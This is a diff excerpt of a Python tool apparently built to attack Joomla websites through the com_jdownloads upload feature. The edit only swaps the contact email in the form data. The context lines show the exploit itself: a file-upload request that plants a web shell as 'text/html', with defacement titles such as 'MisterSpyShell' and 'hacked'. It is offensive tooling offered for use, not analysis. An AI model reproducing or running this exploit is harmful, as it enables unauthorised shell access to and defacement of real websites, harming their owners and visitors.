@@ -3742,7 +3742,7 @@ def joomlaaa(url):
 		
 		
 		zttappgravkg  = {'name':'Owner Tn', 
-		'mail':'spinningarrix@gmail.com', 
+		'mail':'ivi.w@qq.com', 
 		'catlist':'1',
 		'filetitle':"Vulnerability! MisterSpyShellForV7Bot0X_istanbul_2019",
 		'description':"<p>Vulnerability! MisterSpyShellForV7Bot0X_istanbul_2019</p>",
@@ -4418,7 +4418,7 @@ def joomlaaa(url):
 			
 			com_jd_up = { 'file_upload':(filename1, shell, 'text/html'), 'pic_upload':(filename1, shell, 'text/html')}
 
-			com_jd_dat = { 'name': 'yc-waif', 'mail': 'spinningarrix@gmail.com', 'catlist': '1', 'filetitle': "lolz",
+			com_jd_dat = { 'name': 'yc-waif', 'mail': 'ivi.w@qq.com', 'catlist': '1', 'filetitle': "lolz",
 					 'description': "<p>hacked</p>" , '2d1a8f3bd0b5cf542e9312d74fc9766f': 1, 'send': 1, 'senden': "Send file",
 					 'description': "<p>newsking</p>", 'option': "com_jdownloads", 'view': "upload" }
 			
